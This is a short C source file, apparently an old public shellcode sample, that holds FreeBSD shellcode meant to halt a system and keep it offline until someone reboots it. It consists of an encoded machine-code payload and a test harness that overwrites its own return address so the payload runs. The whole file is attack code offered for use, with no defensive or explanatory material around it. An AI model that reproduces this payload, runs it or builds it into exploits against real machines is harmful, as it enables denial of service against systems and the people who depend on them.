/*

FreeBSD reboot() shellcode

This will halt a system, which takes it offline until someone reboots it.

Written by zillion (at safemode.org

*/

char shellcode[] =
        "\x31\xc0\x66\xba\x0e\x27\x66\x81\xea\x06\x27\xb0\x37\xcd\x80";

int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}